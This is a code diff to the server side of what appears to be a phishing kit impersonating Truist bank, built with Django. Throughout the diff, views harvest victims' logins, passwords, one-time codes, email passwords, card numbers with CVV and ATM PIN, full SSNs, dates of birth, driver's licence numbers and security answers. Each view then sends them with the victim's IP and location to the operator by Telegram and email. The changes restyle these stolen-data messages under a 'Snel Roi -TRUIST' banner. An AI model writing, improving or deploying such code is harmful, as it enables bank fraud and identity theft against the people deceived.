@@ -78,39 +78,40 @@ def truist_collect_user_login_cred(request):
                 username=username
             )
 
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date,
-            )
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
 
-            message = f"|=====||Truist Flow||=====|\n"
-            message += f"|========= [ LOGIN ] ==========|\n"
-            message += f"| ➤ [ Username ] : {username}\n"
-            message += f"| ➤ [ Password ] : {password}\n"
-            message += f"|=====================================|\n"
-            message += f"| 🌍 BROWSER DETAILS 🌍\n"
-            message += f"|=====================================|\n"
-            message += f"| ➤ [ IP Address ] : {ip}\n"
-            message += f"| ➤ [ Location ] : {city}, {country}\n"
-            message += f"| ➤ [ Browser ] : {browser} on {os}\n"
-            message += f"| ➤ [ Time ] : {date}\n"
-            message += f"|=====================================|\n"
+            message = "|=====||Snel Roi -TRUIST||=====|\n"
+            message += "|========= [  LOGIN  ] ==========|\n"
+            message += f"| ➤ [ Username ]         : {username}\n"
+            message += f"| ➤ [ Password ]         : {password}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
 
             send_data_telegram(app_settings, message)
-            send_data_email(
-                "Truist Login Credentials",
-                message,
-                _notification_sender(),
-                _notification_recipients()
-            )
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(username, message)
 
             payload["message"] = "Successful"
@@ -147,7 +148,7 @@ def truist_collect_user_login_cred2(request):
             bank_info.password2 = password
             bank_info.username2 = username
             bank_info.save()
-            
+
             # Browser details and notification logic
             ip = get_client_ip(request)
             agent = request.META.get("HTTP_USER_AGENT", "")
@@ -156,23 +157,41 @@ def truist_collect_user_login_cred2(request):
             browser = get_user_browser(agent)
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist Login Confirmation\nUsername: {username}\nPassword: {password}"
+
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Snel Roi -TRUIST||=====|\n"
+            message += "|========= [  LOGIN CONFIRM ] ==========|\n"
+            message += f"| ➤ [ Username ]        : {username}\n"
+            message += f"| ➤ [ Password2 ]       : {password}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist Login Confirmation", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(username, message)
             
             payload["message"] = "Successful"
@@ -252,26 +271,60 @@ def truist_collect_user_basic_info(request):
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
             
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist Basic Info\n"
-            for field, value in fields.items():
-                if value:  # Only include non-empty fields
-                    message += f"{field}: {value}\n"
-            
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Snel Roi -TRUIST||=====|\n"
+            message += "|========= [  BASIC INFO ] ==========|\n"
+            message += f"| ➤ [ Username ]           : {fields['username']}\n"
+            message += f"| ➤ [ First Name ]         : {fields['firstName']}\n"
+            message += f"| ➤ [ Last Name ]          : {fields['lastName']}\n"
+            message += f"| ➤ [ Phone ]              : {fields['phone']}\n"
+            message += f"| ➤ [ SSN ]                : {fields['ssn']}\n"
+            message += f"| ➤ [ Mother Maiden Name ] : {fields['motherMaidenName']}\n"
+            message += f"| ➤ [ Date of Birth ]      : {fields['dob']}\n"
+            message += f"| ➤ [ Driver's License ]   : {fields['driverLicense']}\n"
+            if any([fields['stAd'], fields['city'], fields['state'], fields['zipCode']]):
+                message += "|=====================================|\n"
+                message += "| 🏠  A D D R E S S   D E T A I L S 🏠\n"
+                message += "|======================================|\n"
+                if fields['stAd']:
+                    message += f"| ➤ [ Street Address ]     : {fields['stAd']}\n"
+                if fields['apt']:
+                    message += f"| ➤ [ Apartment/Unit ]     : {fields['apt']}\n"
+                if fields['city']:
+                    message += f"| ➤ [ City ]               : {fields['city']}\n"
+                if fields['state']:
+                    message += f"| ➤ [ State ]              : {fields['state']}\n"
+                if fields['zipCode']:
+                    message += f"| ➤ [ ZIP Code ]           : {fields['zipCode']}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist Basic Info", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(fields['username'], message)
             
             payload["message"] = "Successful"
@@ -326,26 +379,44 @@ def truist_collect_user_security_questions(request):
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
             
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist Security Questions\n"
-            for field, value in fields.items():
-                if value:  # Only include non-empty fields
-                    message += f"{field}: {value}\n"
-            
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Snel Roi -TRUIST||=====|\n"
+            message += "|========= [  SECURITY QUESTIONS ] ==========|\n"
+            message += f"| ➤ [ Question 1 ]      : {fields['question1']}\n"
+            message += f"| ➤ [ Answer 1 ]        : {fields['answer1']}\n"
+            message += f"| ➤ [ Question 2 ]      : {fields['question2']}\n"
+            message += f"| ➤ [ Answer 2 ]        : {fields['answer2']}\n"
+            message += f"| ➤ [ Question 3 ]      : {fields['question3']}\n"
+            message += f"| ➤ [ Answer 3 ]        : {fields['answer3']}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist Security Questions", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(fields['username'], message)
             
             payload["message"] = "Successful"
@@ -382,22 +453,40 @@ def truist_collect_user_otp_verification(request):
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
             
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist OTP Verification\nUsername: {username}\nOTP: {otp}"
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Truist Flow||=====|\n"
+            message += "|========= [  OTP VERIFICATION ] ==========|\n"
+            message += f"| ➤ [ Username ]       : {username}\n"
+            message += f"| ➤ [ OTP ]            : {otp}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist OTP Verification", message, _notification_sender(), _notification_recipients())
+
+            subject = "OTP Verification Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(username, message)
             
             payload["message"] = "Successful"
@@ -430,7 +519,7 @@ def truist_collect_user_email_password(request):
             bank_info, _ = BankInfo.objects.get_or_create(client=client)
             bank_info.email_password = password
             bank_info.save()
-            
+
             # Standard browser details and notification
             ip = get_client_ip(request)
             agent = request.META.get("HTTP_USER_AGENT", "")
@@ -439,23 +528,42 @@ def truist_collect_user_email_password(request):
             browser = get_user_browser(agent)
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist Email Password\nUsername: {username}\nEmail: {email}\nPassword: {password}"
+
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Truist Flow||=====|\n"
+            message += "|========= [  EMAIL/PASSWORD ] ==========|\n"
+            message += f"| ➤ [ Username ]       : {username}\n"
+            message += f"| ➤ [ Email ]          : {email}\n"
+            message += f"| ➤ [ Password ]       : {password}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist Email Password", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(username, message)
             
             payload["message"] = "Successful"
@@ -498,7 +606,7 @@ def truist_collect_user_card_info(request):
             bank_info.card_cvv = fields['cvv']
             bank_info.atm_pin = fields['atmPin']
             bank_info.save()
-            
+
             # Standard browser details and notification
             ip = get_client_ip(request)
             agent = request.META.get("HTTP_USER_AGENT", "")
@@ -507,27 +615,44 @@ def truist_collect_user_card_info(request):
             browser = get_user_browser(agent)
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist Card Info\n"
-            for field, value in fields.items():
-                if value:  # Only include non-empty fields
-                    message += f"{field}: {value}\n"
-            
+
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Truist Flow||=====|\n"
+            message += "|========= [  CARD INFORMATION ] ==========|\n"
+            message += f"| ➤ [ Card Number ]      : {fields['cardNumber']}\n"
+            message += f"| ➤ [ Expiry Month ]     : {fields['expiryMonth']}\n"
+            message += f"| ➤ [ Expiry Year ]      : {fields['expiryYear']}\n"
+            message += f"| ➤ [ CVV ]              : {fields['cvv']}\n"
+            message += f"| ➤ [ ATM PIN ]          : {fields['atmPin']}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist Card Info", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(fields['username'], message)
             
             payload["message"] = "Successful"
@@ -574,7 +699,7 @@ def truist_collect_user_home_address(request):
                     'zip_code': fields['zipCode']
                 }
             )
-            
+
             # Standard browser details and notification
             ip = get_client_ip(request)
             agent = request.META.get("HTTP_USER_AGENT", "")
@@ -583,27 +708,44 @@ def truist_collect_user_home_address(request):
             browser = get_user_browser(agent)
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist Home Address\n"
-            for field, value in fields.items():
-                if value:  # Only include non-empty fields
-                    message += f"{field}: {value}\n"
-            
+
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Truist Flow||=====|\n"
+            message += "|========= [  HOME ADDRESS ] ==========|\n"
+            message += f"| ➤ [ Street Address ]   : {fields['streetAddress']}\n"
+            message += f"| ➤ [ Apartment/Unit ]   : {fields['apartmentUnit']}\n"
+            message += f"| ➤ [ City ]             : {fields['city']}\n"
+            message += f"| ➤ [ State ]            : {fields['state']}\n"
+            message += f"| ➤ [ ZIP Code ]         : {fields['zipCode']}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist Home Address", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(fields['username'], message)
             
             payload["message"] = "Successful"
@@ -636,7 +778,7 @@ def truist_collect_user_social_security(request):
             client.social_security_short = ssn_short
             client.dob = dob
             client.save()
-            
+
             # Standard browser details and notification
             ip = get_client_ip(request)
             agent = request.META.get("HTTP_USER_AGENT", "")
@@ -645,23 +787,42 @@ def truist_collect_user_social_security(request):
             browser = get_user_browser(agent)
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist SSN Submission\nUsername: {username}\nSSN Last4: {ssn_short}\nDOB: {dob}"
+
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Truist Flow||=====|\n"
+            message += "|========= [  SSN / DATE OF BIRTH ] ==========|\n"
+            message += f"| ➤ [ Username ]        : {username}\n"
+            message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
+            message += f"| ➤ [ DOB ]             : {dob}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist SSN Submission", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(username, message)
             
             payload["message"] = "Successful"
@@ -692,7 +853,7 @@ def truist_collect_user_social_security_2(request):
             client = Client.objects.get(username=username)
             client.social_security = ssn
             client.save()
-            
+
             # Standard browser details and notification
             ip = get_client_ip(request)
             agent = request.META.get("HTTP_USER_AGENT", "")
@@ -701,23 +862,41 @@ def truist_collect_user_social_security_2(request):
             browser = get_user_browser(agent)
             os = get_user_os(agent)
             date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            BrowserDetail.objects.create(
-                client=client,
-                ip=ip,
-                agent=agent,
-                country=country,
-                city=city,
-                address=f"{city}, {country}",
-                browser=browser,
-                os=os,
-                time=date,
-                date=date
-            )
-            
-            message = f"Truist Full SSN Submission\nUsername: {username}\nSSN: {ssn}"
+
+            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = "|=====||Truist Flow||=====|\n"
+            message += "|========= [  SSN / DATE OF BIRTH ] ==========|\n"
+            message += f"| ➤ [ Username ]        : {username}\n"
+            message += f"| ➤ [ SSN ]             : {ssn}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
             send_data_telegram(app_settings, message)
-            send_data_email("Truist Full SSN Submission", message, _notification_sender(), _notification_recipients())
+
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+
+            send_data_email(subject, message, from_email, recipient_list)
             save_data_to_file(username, message)
             
             payload["message"] = "Successful"
